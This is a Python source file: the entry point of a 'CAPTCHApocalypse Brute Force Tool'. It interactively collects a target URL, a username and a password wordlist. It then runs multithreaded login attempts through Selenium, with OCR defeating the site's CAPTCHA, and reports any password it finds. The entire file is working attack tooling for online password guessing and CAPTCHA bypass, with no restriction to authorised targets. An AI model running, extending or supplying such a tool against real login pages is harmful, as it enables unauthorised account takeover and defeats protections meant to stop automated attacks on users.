"""Main entry point with CAPTCHA strength selection"""

import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

from .config import current_config, CAPTCHA_STRENGTHS
from .brute_force import BruteForcer
from .ocr.factory import OCRFactory
from .selenium_driver import DriverManager
from .wordlist import WordlistLoader
from .utils import Logger, InputHandler


def show_banner():
    """Display welcome banner"""
    Logger.header("🚀 CAPTCHApocalypse Brute Force Tool v3.2 🚀")
    Logger.info("Interactive CAPTCHA Solver with Strength Selection")
    Logger.info("")


def main():
    """Main execution function with interactive prompts"""

    show_banner()

    try:
        # Get all inputs from user
        Logger.info("[*] Please configure the tool...")
        Logger.separator()

        target_url = InputHandler.get_target_url()
        username = InputHandler.get_username()
        wordlist_path = InputHandler.get_wordlist_path()
        max_passwords = InputHandler.get_max_passwords()
        max_workers = InputHandler.get_max_workers()
        ocr_engine = InputHandler.get_ocr_engine()
        captcha_strength = InputHandler.get_captcha_strength()

        # Confirm settings
        if not InputHandler.confirm_settings(
            target_url, username, wordlist_path, 
            max_passwords, max_workers, ocr_engine, captcha_strength
        ):
            Logger.info("")
            Logger.warning("[!] Cancelled by user")
            return

        Logger.info("")
        Logger.separator()

        # Load wordlist
        wordlist_loader = WordlistLoader()
        passwords = wordlist_loader.load_passwords(wordlist_path, max_passwords)

        if not passwords:
            Logger.error("[!] No passwords loaded")
            return

        # Initialize OCR processor with CAPTCHA strength
        try:
            ocr_processor = OCRFactory.create_ocr_processor(
                engine=ocr_engine,
                captcha_strength=captcha_strength
            )
        except ValueError as e:
            Logger.error(f"[!] {e}")
            return

        # Initialize Selenium driver manager
        driver_manager = DriverManager(
            headless=current_config.HEADLESS,
            disable_sandbox=current_config.DISABLE_SANDBOX,
            disable_dev_shm=current_config.DISABLE_DEV_SHM
        )

        # Create brute forcer
        brute_forcer = BruteForcer(
            target_url=target_url,
            username=username,
            ocr_processor=ocr_processor,
            driver_manager=driver_manager,
            wait_timeout=current_config.WAIT_TIMEOUT,
            page_load_wait=current_config.PAGE_LOAD_WAIT,
            response_wait=current_config.RESPONSE_WAIT,
            captcha_strength=captcha_strength
        )

        # Start brute force
        Logger.info(f"[*] Starting brute force with {len(passwords)} passwords...\n")

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {
                executor.submit(brute_forcer.bruteforce, pwd): pwd
                for pwd in passwords
            }

            for future in as_completed(futures):
                try:
                    future.result()
                    if brute_forcer.found_password_event.is_set():
                        for f in futures:
                            f.cancel()
                        break
                except Exception as e:
                    Logger.error(f"[!] Worker thread error: {e}")

        # Final result
        Logger.separator()
        if brute_forcer.found_password:
            Logger.success(
                f"[+] FINAL RESULT: Password Found = {brute_forcer.found_password}"
            )
        else:
            Logger.error("[−] FINAL RESULT: Password Not Found in Wordlist")

        Logger.info(f"[*] Total Attempts: {brute_forcer.attempt_count}")
        Logger.info(f"[*] Failed CAPTCHA Reads: {brute_forcer.failed_captcha_count}")
        Logger.separator()
        Logger.info("")

    except KeyboardInterrupt:
        Logger.error("\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        Logger.error(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
